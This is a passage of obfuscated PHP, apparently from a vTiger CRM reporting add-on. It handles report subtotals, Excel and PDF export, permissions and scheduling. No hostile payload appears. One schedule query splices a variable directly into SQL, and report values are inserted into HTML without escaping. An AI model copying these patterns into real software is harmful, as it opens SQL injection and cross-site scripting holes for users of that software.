$ZZZZZZZZZZZZZZZZZZB11) {if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && in_array($ZZZZZZZZZZZZZZZZZZG66, $ZZZH77)){$ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44] += $ZZZZZZZZZZZZZZZZZZF55;} elseif((!isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && in_array($ZZZZZZZZZZZZZZZZZZG66, $ZZZH77)) || in_array($ZZZZZZZZZZZZZZZZZZG66, $ZZZZZZZZZZZZZZZJ99)){$ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44] = $ZZZZZZZZZZZZZZZZZZF55;}}}} $ZZZZZK1010 = count($ZZZZZZZZZZZZZZZJ99)-1;if(!empty($ZR1717)){do{$ZZZZZZZZZZZZZZZZZZC22 = $ZZZZZZZZZZZZZZZJ99[$ZZZZZK1010];foreach ($ZR1717[$ZZZZZZZZZZZZZZZZZZC22] as $Zu20 => $value) {$ZZZZZZZZZZZZZZZZZZj9[$Zu20] = "<SubTotal>".$value;if(in_array($Zu20, $ZZZZZZZZZZZZZZZJ99) && $Zu20 != $ZZZZZZZZZZZZZZZZZZC22) unset($ZZZZZZZZZZZZZZZZZZj9[$Zu20]);} if(!isset($ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22]))$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = 0;array_splice($r17['data'], (int)$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22], 0, array($ZZZZZZZZZZZZZZZZZZj9));$ZZZZZZZZZZZZZZZZZZw22++;$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;$ZZZZZK1010--;unset($ZZZZZZZZZZZZZZZZZZj9);}while($ZZZZZZZZZZZZZZZZZZC22 != $ZZZZZZZZZZZZZZZJ99[0]);} $r17["data"] = ZZZZZZZZZZZZZZZZZZH77($r17["data"], $ZZZH77);}}elseif ($ZZZJ99->includeDetails) {foreach ($ZZZZZZZZZZZZZZZZZZs18 as $ZZZZn13) {if($ZZZZn13['dateGrouping'] != "") $ZZZZZZZZZZZZZZZZZZx23 = $ZZZZn13['name']."_".$ZZZZn13['dateGrouping'];else $ZZZZZZZZZZZZZZZZZZx23 = $ZZZZn13['name'];$ZZZZZZZZZZZZZZZJ99[] = $ZZZZZZZZZZZZZZZZZZx23;$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZx23] = 0;foreach($ZZZZn13['showAggregates'] as $ZZZZZZZZZZZZZZZZZZy24 => $ZZZZZZZZZZZZP1515){if(isset($ZZZZZZZZZZZZP1515['sum']) && $ZZZZZZZZZZZZP1515['sum']) $ZZZZZZZZZZZZZZZZZZu20[] = $ZZZZZZZZZZZZZZZZZZy24;if(isset($ZZZZZZZZZZZZP1515['count']) && $ZZZZZZZZZZZZP1515['count']) $ZZZZZZZZZZZZZZZZZZv21[] = $ZZZZZZZZZZZZZZZZZZy24;} $ZZZZZZZZZZZZZZZZZZu20 = array_unique($ZZZZZZZZZZZZZZZZZZu20);$ZZZZZZZZZZZZZZZZZZv21 = array_unique($ZZZZZZZZZZZZZZZZZZv21);} if(count($ZZZZZZZZZZZZZZZJ99)>0){foreach ($r17['data'] as $ZZZZZZZZZZZZZZZZZZz25 => $ZZZZZZZZZZZZZZZZZZA00) {foreach ($ZZZZZZZZZZZZZZZJ99 as $ZZZZZZZZZZZZZZZZZZB11) {if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZB11]) && $ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZB11] != $ZZZZZZZZZZZZZZZZZZA00[$ZZZZZZZZZZZZZZZZZZB11]){$ZZZZZK1010 = count($ZZZZZZZZZZZZZZZJ99)-1;do{$ZZZZZZZZZZZZZZZZZZC22 = $ZZZZZZZZZZZZZZZJ99[$ZZZZZK1010];foreach ($ZR1717[$ZZZZZZZZZZZZZZZZZZC22] as $Zu20 => $value) {$ZZZZZZZZZZZZZZZZZZj9[$Zu20] = "<SubTotal>".$value;if(in_array($Zu20, $ZZZZZZZZZZZZZZZJ99) && $Zu20 != $ZZZZZZZZZZZZZZZZZZC22) unset($ZZZZZZZZZZZZZZZZZZj9[$Zu20]);} array_splice($r17['data'], (int)$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22], 0, array($ZZZZZZZZZZZZZZZZZZj9));$ZZZZZZZZZZZZZZZZZZw22++;$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;$ZZZZZK1010--;}while($ZZZZZZZZZZZZZZZZZZC22 != $ZZZZZZZZZZZZZZZZZZB11);if($ZZZZZZZZZZZZZZZZZZB11 == $ZZZZZZZZZZZZZZZJ99[0]) {foreach ($ZZZZZZZZZZZZZZZZZZt19 as &$ZZZZZZZZZZZZZZZZZZD33) $ZZZZZZZZZZZZZZZZZZD33 = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;unset($ZR1717);} if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11]))unset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11]);break;}} foreach ($ZZZZZZZZZZZZZZZZZZA00 as $ZZZZZZZZZZZZZZZZZZE44 => $ZZZZZZZZZZZZZZZZZZF55) {foreach ($ZZZZZZZZZZZZZZZJ99 as $ZZZZZZZZZZZZZZZZZZB11) {if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && in_array($ZZZZZZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZZZZZu20)) $ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44] += $ZZZZZZZZZZZZZZZZZZF55;elseif(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && in_array($ZZZZZZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZZZZZv21)) $ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]++;elseif(!isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && (in_array($ZZZZZZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZZJ99) || in_array($ZZZZZZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZZZZZu20))){$ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44] = $ZZZZZZZZZZZZZZZZZZF55;} elseif(!isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44]) && in_array($ZZZZZZZZZZZZZZZZZZE44, $ZZZZZZZZZZZZZZZZZZv21)) $ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZE44] = 1;}}} $ZZZZZK1010 = count($ZZZZZZZZZZZZZZZJ99)-1;do{$ZZZZZZZZZZZZZZZZZZC22 = $ZZZZZZZZZZZZZZZJ99[$ZZZZZK1010];foreach ($ZR1717[$ZZZZZZZZZZZZZZZZZZC22] as $Zu20 => $value) {$ZZZZZZZZZZZZZZZZZZj9[$Zu20] = "<SubTotal>".$value;if(in_array($Zu20, $ZZZZZZZZZZZZZZZJ99) && $Zu20 != $ZZZZZZZZZZZZZZZZZZC22) unset($ZZZZZZZZZZZZZZZZZZj9[$Zu20]);} array_splice($r17['data'], (int)$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22], 0, array($ZZZZZZZZZZZZZZZZZZj9));$ZZZZZZZZZZZZZZZZZZw22++;$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;$ZZZZZK1010--;}while($ZZZZZZZZZZZZZZZZZZC22 != $ZZZZZZZZZZZZZZZJ99[0]);$r17["data"] = ZZZZZZZZZZZZZZZZZZH77($r17["data"], $ZZZZZZZZZZZZZZZZZZv21);}}} $r17["title"] = $ZZZZZZZZZZZZZZZZZZn13["title"];return $r17;} function ZZZZZZZZZZZZZZZZZZH77($r17, $ZZZZZZZZZZZZZZZZZZv21){global $current_user;$ZZZZS1818 = new ZZZZT1919();$ZZZZZZZZZZZZZZZZZZI88 = $ZZZZS1818->ZZZZX2323($current_user);$ZZZZZZZZZZZZZZZZZZJ99 = $ZZZZZZZZZZZZZZZZZZI88['decimal'];$ZZZZZZZZZZZZZZZZZZK1010 = $ZZZZZZZZZZZZZZZZZZI88['seperator'];$ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();foreach ($r17 as $ZZZZZZZZZZZZZZZZZZL1111 => $ZZZZZZZZZZZZZZZZZZM1212) {foreach ($ZZZZZZZZZZZZZZZZZZM1212 as $ZZZZZZZZZZZZZZZZZZN1313 => $ZZZZZZZZZZZZZZZZZZO1414) {if(substr($ZZZZZZZZZZZZZZZZZZO1414, 0, 10) == "<SubTotal>" && is_numeric(str_replace("<SubTotal>", "", $ZZZZZZZZZZZZZZZZZZO1414))){if(substr($ZZZZZZZZZZZZZZZZZZN1313, -4) != "_cnt" && !in_array($ZZZZZZZZZZZZZZZZZZN1313."_cnt", $ZZZZZZZZZZZZZZZZZZv21) && !in_array($ZZZZZZZZZZZZZZZZZZN1313, $ZZZZZZZZZZZZZZZZZZv21)){$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = str_replace("<SubTotal>", "", $r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313]);$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = number_format(floatval($r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313]),$ZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZZJ99,$ZZZZZZZZZZZZZZZZZZK1010);$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = "<SubTotal>".$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313];}else{$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = str_replace("<SubTotal>", "", $r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313]);$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = number_format(floatval($r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313]),0,$ZZZZZZZZZZZZZZZZZZJ99,$ZZZZZZZZZZZZZZZZZZK1010);$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313] = "<SubTotal>".$r17[$ZZZZZZZZZZZZZZZZZZL1111][$ZZZZZZZZZZZZZZZZZZN1313];}}}} return $r17;} function ZZZZZZZZZZZZZZZZZZP1515($r17){$ZZZZZZZZZZZZZZE44 = array_keys($r17["cols"]);$ZZS1818 = array();$ZZS1818[] = array_values($r17["cols"]);$ZZT1919 = count($ZZZZZZZZZZZZZZE44);$ZZZZZZZZZZZZZZs18 = count($r17["data"]);for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZZZs18;$Zf5++){$ZZZz25 = array();for($ZZZZZK1010 = 0;$ZZZZZK1010<$ZZT1919;$ZZZZZK1010++){$ZZZz25[] = (isset($r17["data"][$Zf5][$ZZZZZZZZZZZZZZE44[$ZZZZZK1010]]))?($r17["data"][$Zf5][$ZZZZZZZZZZZZZZE44[$ZZZZZK1010]]):("");} $ZZS1818[] = $ZZZz25;} $ZZZZZZZZZZZZZZZZZZQ1616 = new PHPExcel();$ZZZZZZZZZZZZZZZZZZQ1616->getProperties()->setCreator("Advanced Reporting For vTiger") ->setLastModifiedBy("ITSAPIENS.EU") ->setTitle("REPORT") ->setSubject("REPORT") ->setDescription("REPORT");$ZZZZZZZZZZZZZZZZZZR1717 = $ZZZZZZZZZZZZZZZZZZQ1616->getActiveSheet();$ZZZZZZZZZZZZZZZZZZR1717->fromArray($ZZS1818);return $ZZZZZZZZZZZZZZZZZZQ1616;} function ZZZZZZZZZZZZZZZZZZS1818($r17){if(file_exists(dirname(__FILE__)."/generatePDFHTML.php")) {require_once dirname(__FILE__)."/generatePDFHTML.php";}else{$ZZZZZZZZZZZd3 = array_keys($r17["cols"]);$ZZZZZZZZZZZZZZZZZZT1919 = count($ZZZZZZZZZZZd3);$ZZZZZZZZZZZZZZZZZZU2020 = "<style> thead{font-weight: bold;} th{font-weight: bold;font-size: 12pt;} td,th{border: solid 1px #000000;page-break-inside:avoid;} tr{page-break-inside:avoid;} table{white-space: nowrap;} </style> <h3>".$r17["title"]."</h3> ";$ZZZZZZZZZZZZZZZZZZU2020.= "<table><thead><tr>";for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZZZZZZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZU2020.= "<th><b>";$ZZZZZZZZZZZZZZZZZZU2020.= $r17["cols"][$ZZZZZZZZZZZd3[$Zf5]];$ZZZZZZZZZZZZZZZZZZU2020.= "</b></th>";} $ZZZZZZZZZZZZZZZZZZU2020.= "</tr></thead><tbody>";$ZZT1919 = count($r17["data"]);for($ZZZZZK1010 = 0;$ZZZZZK1010<$ZZT1919;$ZZZZZK1010++){$ZZZZZZZZZZZZZZZZZZU2020.= "<tr>";for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZZZZZZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZU2020.= "<td>";if(isset($r17["data"][$ZZZZZK1010][$ZZZZZZZZZZZd3[$Zf5]])){@$ZZZZZZZZZZZZZZZZZZU2020.= (($ZZZZZZZZZZZd3[$Zf5] == "grand_total" || $r17["data"][$ZZZZZK1010][$ZZZZZZZZZZZd3[0]] == "Grand Total" || substr($r17["data"][$ZZZZZK1010][$ZZZZZZZZZZZd3[$Zf5]], 0, 10) == "<SubTotal>") ? "<b>".$r17["data"][$ZZZZZK1010][$ZZZZZZZZZZZd3[$Zf5]]."</b>":$r17["data"][$ZZZZZK1010][$ZZZZZZZZZZZd3[$Zf5]]);} $ZZZZZZZZZZZZZZZZZZU2020.= "</td>";} $ZZZZZZZZZZZZZZZZZZU2020.= "</tr>";} $ZZZZZZZZZZZZZZZZZZU2020.= "</tbody></table>";} return $ZZZZZZZZZZZZZZZZZZU2020;}
function ZZZZZZZZZZZZZZZZZZV2121($ZZZZZZZZZZZZZZZZZZW2222){if($ZZZZZZZZZZZZZZZZZZW2222 <= 760) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "A4";} elseif($ZZZZZZZZZZZZZZZZZZW2222 >= 761 && $ZZZZZZZZZZZZZZZZZZW2222 <= 1120) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "A3";}elseif($ZZZZZZZZZZZZZZZZZZW2222 >=1121 && $ZZZZZZZZZZZZZZZZZZW2222 <= 1600) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "A2";}elseif($ZZZZZZZZZZZZZZZZZZW2222 >=1601 && $ZZZZZZZZZZZZZZZZZZW2222 <= 2200) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "A1";} elseif($ZZZZZZZZZZZZZZZZZZW2222 >=2201 && $ZZZZZZZZZZZZZZZZZZW2222 <= 3360) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "A0";} elseif($ZZZZZZZZZZZZZZZZZZW2222 >=3361 && $ZZZZZZZZZZZZZZZZZZW2222 <= 4680) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "2A0";} elseif($ZZZZZZZZZZZZZZZZZZW2222 >=4681 && $ZZZZZZZZZZZZZZZZZZW2222 <= 6490) {$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = "4A0";}else{$ZZZZZZZZZZZZZZZZZZX2323 = "L";$ZZZZZZZZZZZZZZZZZZY2424 = array(round($ZZZZZZZZZZZZZZZZZZW2222/1.5),$ZZZZZZZZZZZZZZZZZZW2222);} return array($ZZZZZZZZZZZZZZZZZZX2323,$ZZZZZZZZZZZZZZZZZZY2424);}
;class ZZZZZZZZZZZZZZZZZc2 {protected $db;protected $ZZZZS1818;function __construct($db, $ZZZZS1818) {$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;} function ZZZZZZZZZZZZZZZZZd3($ZZZZZZZZZZZZZZZZZe4,$ZZZZZZZZZZZZZZZZZf5,$ZZZZZZZZZZZZZZZZZg6){$ZZS1818 = array();$ZZT1919= count($ZZZZZZZZZZZZZZZZZe4);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = array('id'=>$ZZZZZZZZZZZZZZZZZf5.$ZZZZZZZZZZZZZZZZZe4[$Zf5]["id"], 'name'=>$ZZZZZZZZZZZZZZZZZg6.$ZZZZZZZZZZZZZZZZZe4[$Zf5]["name"]);} return $ZZS1818;} function ZZZZZZZZZZZZZZZZZh7($ZZZZZZZZZZZZZZZZZe4,$prefix){$ZZS1818 = array();$ZZT1919= count($ZZZZZZZZZZZZZZZZZe4);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if($ZZZZZZZZZZZZZZZZZe4[$Zf5]["level"]==2) $ZZS1818[$prefix.$ZZZZZZZZZZZZZZZZZe4[$Zf5]["id"]] = "DELETE";elseif($ZZZZZZZZZZZZZZZZZe4[$Zf5]["level"]==1) $ZZS1818[$prefix.$ZZZZZZZZZZZZZZZZZe4[$Zf5]["id"]] = "EDIT";else $ZZS1818[$prefix.$ZZZZZZZZZZZZZZZZZe4[$Zf5]["id"]] = "VIEW";} return $ZZS1818;} function ZZZZf5(){return $this->db->ZZZZf5();} function ZZZZZZZZZZZZZZZZZi8(){$ZZZZA00 = $this->db->ZZZZf5();$ZZZZA00 = $this->ZZZZZZZZZZZZZZZZZd3($ZZZZA00,"u_",$this->ZZZZS1818->ZZZZZk10("label_user","AnalyticReporting")."::");$ZZZZE44 = $this->db->ZZZZr17();$ZZZZE44 = $this->ZZZZZZZZZZZZZZZZZd3($ZZZZE44,"r_",$this->ZZZZS1818->ZZZZZk10("label_role","AnalyticReporting")."::");$ZZS1818 = array_merge($ZZZZA00, $ZZZZE44);return $ZZS1818;} function ZZZZZZZZZZZZZZZZZj9($ZZZC22){$ZZZZA00 = $this->db->ZZZZg6($ZZZC22);$ZZZZA00 = $this->ZZZZZZZZZZZZZZZZZh7($ZZZZA00,"u_");$ZZZZE44 = $this->db->ZZZZp15($ZZZC22);$ZZZZE44 = $this->ZZZZZZZZZZZZZZZZZh7($ZZZZE44,"r_");$ZZS1818 = array_merge($ZZZZA00,$ZZZZE44);return $ZZS1818;} function ZZZZZZZZZZZZZZZZZk10(){$ZZS1818 = $this->ZZZZZZZZZZZZZZZZZi8();$ZZZZE44 = $this->db->ZZZZr17();$ZZZZE44 = $this->ZZZZZZZZZZZZZZZZZd3($ZZZZE44,"r_",$this->ZZZZS1818->ZZZZZk10("label_role","AnalyticReporting")."::");$ZZS1818 = array_merge($ZZS1818,$ZZZZE44);return $ZZS1818;} function ZZZZZZZZZZZZZZZZZl11($prefix,$name,$ZZZZZZZZZZZZZZZZR1717){$ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZZR1717);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $prefix.$ZZZZZZZZZZZZZZZZR1717[$Zf5][$name];} return $ZZS1818;} function ZZZZZZZZZZZZZZZZZm12($ZZZC22){$ZZZZA00 = $this->db->ZZZZh7($ZZZC22);$ZZZZA00 = $this->ZZZZZZZZZZZZZZZZZl11("u_","user",$ZZZZA00);$ZZZZE44 = $this->db->ZZZZj9($ZZZC22);$ZZZZE44 = $this->ZZZZZZZZZZZZZZZZZl11("r_","role",$ZZZZE44);$ZZS1818 = array_merge($ZZZZA00,$ZZZZE44);return $ZZS1818;} function ZZZZZZZZZZZZZZZZZn13($ZZZC22){$ZZZz25 = $this->db->ZZZu20("SELECT * FROM advancedreports_schedule WHERE id = $ZZZC22");$ZZS1818 = array("isScheduled" => false, "interval" => 0, "intervalOptions" => array("01","01"), "timeH" => "12", "timeM" => "00", "formats" =>new stdClass(),);if(!empty($ZZZz25)){$ZZS1818["isScheduled"] = true;$ZZS1818["interval"] = $ZZZz25[0]['interval'];$ZZZZZZZZZZZZZZZZZo14 = explode(":",$ZZZz25[0]["time"]);$ZZS1818["timeH"] = $ZZZZZZZZZZZZZZZZZo14[0];$ZZS1818["timeM"] = $ZZZZZZZZZZZZZZZZZo14[1];$ZZS1818["intervalOptions"] = $ZZZz25[0]["interval_options"];if(in_array($ZZS1818["interval"],array(2,4))){$ZZS1818["intervalOptions"] = explode("-",$ZZS1818["intervalOptions"]);}elseif($ZZS1818["interval"]==3){$ZZS1818["intervalOptions"] = array("01",$ZZS1818["intervalOptions"]);}elseif($ZZS1818["interval"]==1){$ZZS1818["intervalOptions"] = array($ZZS1818["intervalOptions"],"01");} if(!empty($ZZZz25[0]["formats"])){$ZZS1818["formats"] = json_decode($ZZZz25[0]["formats"]);}else{$ZZS1818["formats"] = json_decode('{"xlsx":true,"pdf":false,"url":false}');}} return $ZZS1818;} function ZZZZZZZZZZZZZZZZZp15($ZZZZW2222,$report){if($this->ZZZZS1818->ZZZZU2020($ZZZZW2222)){return 3;} $ZZZY2424 = $this->ZZZZS1818->ZZZZV2121($ZZZZW2222);$ZZZZy24 = $this->ZZZZS1818->getUserGroups($ZZZY2424);$ZZZz25 = $this->db->ZZZZw22($ZZZY2424,$ZZZZy24,$report);$ZZS1818 = ($ZZZz25[0]['level'] == null) ? 0 : $ZZZz25[0]['level'] + 1;return $ZZS1818;} function ZZZZZZZZZZZZZZZZZq16($ZZZC22,$r17){$ZZZZy24 = array();$ZZZZA00 = array();foreach($r17 as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$ZZZz25 = explode("_",$ZZZT1919,2);if(count($ZZZz25) == 2){if($ZZZZZZZZZZZZZZZe4=="DELETE") $ZZZZZZZZZZZZZZZZZr17 = 2;elseif ($ZZZZZZZZZZZZZZZe4=="EDIT") $ZZZZZZZZZZZZZZZZZr17 = 1;else $ZZZZZZZZZZZZZZZZZr17 = 0;if($ZZZz25[0]=="u"){$ZZZZA00[] = array($ZZZC22,$ZZZz25[1],$ZZZZZZZZZZZZZZZZZr17);}else{$ZZZZy24[] = array($ZZZC22,$ZZZz25[1],$ZZZZZZZZZZZZZZZZZr17);}}} $this->db->ZZZZx23($ZZZC22,$ZZZZy24);$this->db->ZZZZz25($ZZZC22,$ZZZZA00);} function ZZZZZZZZZZZZZZZZZs18($ZZZC22,$r17){$ZZZZA00 = array();$ZZZZy24 = array();$ZZZZE44 = array();$ZZT1919 = count($r17);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZz25 = explode("_",$r17[$Zf5], 2);switch($ZZZz25[0]){case "u": $ZZZZA00[]= $ZZZz25[1];break;case "g": $ZZZZy24[]= $ZZZz25[1];break;case "r": $ZZZZE44[]= $ZZZz25[1];break;}} $this->db->ZZZZC22($ZZZC22,$ZZZZA00);$this->db->ZZZZD33($ZZZC22,$ZZZZE44);} function ZZZZZZZZZZZZZZZZZt19($ZZZC22){$this->db->ZZZA00("DELETE FROM advancedreports_schedule WHERE id = ?", array($ZZZC22));$this->db->ZZZA00("DELETE FROM advancedreports_schedule_u WHERE id = ?", array($ZZZC22));$this->db->ZZZA00("DELETE FROM advancedreports_schedule_r WHERE id = ?", array($ZZZC22));} function ZZZZZZZZZZZZZZZZZu20($ZZZZZZZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZw22,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZO1414){$ZZZZZZZZZZZZZZZZZx23 = array("Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday");switch($ZZZZZZZZZZZZZZZZZv21){case 1: $ZZZZZZZZZZZZZZZZZy24 = strtotime("this ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22]);break;case 2: $ZZZZZZZZZZZZZZZZZw22 = explode("-",$ZZZZZZZZZZZZZZZZZw22,2);if($ZZZZZZZZZZZZZZZZZw22[1] == 0){$ZZZZZZZZZZZZZZZZZz25 = "first";$ZZZZZZZZZZZZZZZZZA00 = "third";}else{$ZZZZZZZZZZZZZZZZZz25 = "second";$ZZZZZZZZZZZZZZZZZA00 = "fourth";} $ZZZZZZZZZZZZZZZZZB11 = strtotime('today');$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZz25." ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of this month");if($ZZZZZZZZZZZZZZZZZB11>$ZZZZZZZZZZZZZZZZZy24){$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZA00." ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of this month");} break;case 3: $ZZZz25 = date("Y-m-d");$ZZZz25 = preg_replace('/[0-9][0-9]$/',$ZZZZZZZZZZZZZZZZZw22,$ZZZz25);$ZZZZZZZZZZZZZZZZZC22 = date('Y-m-d', strtotime('last day of this month'));if($ZZZz25>$ZZZZZZZZZZZZZZZZZC22){$ZZZz25 = $ZZZZZZZZZZZZZZZZZC22;} $ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case 4: $ZZZZZZZZZZZB11 = ((int)date("Y"));$ZZZz25 = $ZZZZZZZZZZZB11."-".$ZZZZZZZZZZZZZZZZZw22;$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case 0: default: $ZZZZZZZZZZZZZZZZZy24 = strtotime("today");break;} $ZZZZZZZZZZZZo14 = date("Y-m-d ",$ZZZZZZZZZZZZZZZZZy24);$ZZZZZZZZZZZZZZZZZD33 = $ZZZZZZZZZZZZo14.$ZZZZZZZZZZZZZZZZZo14.":00";$ZZZZZZZZZZZZZZZZZE44 = date_default_timezone_get();date_default_timezone_set($ZZZZZZO1414);$ZZZZZZZZZZZZc2 = strtotime($ZZZZZZZZZZZZZZZZZD33);date_default_timezone_set($ZZZZZZZZZZZZZZZZZE44);return date("Y-m-d H:i:s",$ZZZZZZZZZZZZc2);} function ZZZZZZZZZZZZZZZZZF55($ZZZZZZZZZZZZZZZZZv21,$ZZZZZZZZZZZZZZZZZw22,$ZZZZZZZZZZZZZZZZZo14,$ZZZZZZO1414){$ZZZZZZZZZZZZZZZZZx23 = array("Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday");switch($ZZZZZZZZZZZZZZZZZv21){case 1: $ZZZZZZZZZZZZZZZZZy24 = strtotime("next ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22]);break;case 2: $ZZZZZZZZZZZZZZZZZw22 = explode("-",$ZZZZZZZZZZZZZZZZZw22,2);if($ZZZZZZZZZZZZZZZZZw22[1] == 0){$ZZZZZZZZZZZZZZZZZz25 = "first";$ZZZZZZZZZZZZZZZZZA00 = "third";}else{$ZZZZZZZZZZZZZZZZZz25 = "second";$ZZZZZZZZZZZZZZZZZA00 = "fourth";} $ZZZZZZZZZZZZZZZZZB11 = date("Y-m-d");$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZA00." ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of this month");if($ZZZZZZZZZZZZZZZZZB11>=date("Y-m-d",$ZZZZZZZZZZZZZZZZZy24)){$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZZZZZZZZZZZZZZZz25." ".$ZZZZZZZZZZZZZZZZZx23[$ZZZZZZZZZZZZZZZZZw22[0]]." of next month");} break;case 3: $ZZZz25 = date("Y-m-d",strtotime("+1 month"));$ZZZz25 = preg_replace('/[0-9][0-9]$/',$ZZZZZZZZZZZZZZZZZw22,$ZZZz25);$ZZZZZZZZZZZZZZZZZC22 = date('Y-m-d', strtotime('last day of next month'));if($ZZZz25>$ZZZZZZZZZZZZZZZZZC22){$ZZZz25 = $ZZZZZZZZZZZZZZZZZC22;} $ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case 4: $ZZZZZZZZZZZB11 = ((int)date("Y") + 1);$ZZZz25 = $ZZZZZZZZZZZB11."-".$ZZZZZZZZZZZZZZZZZw22;$ZZZZZZZZZZZZZZZZZy24 = strtotime($ZZZz25);break;case 0: default: $ZZZZZZZZZZZZZZZZZy24 = strtotime("+1 day");break;} $ZZZZZZZZZZZZo14 = 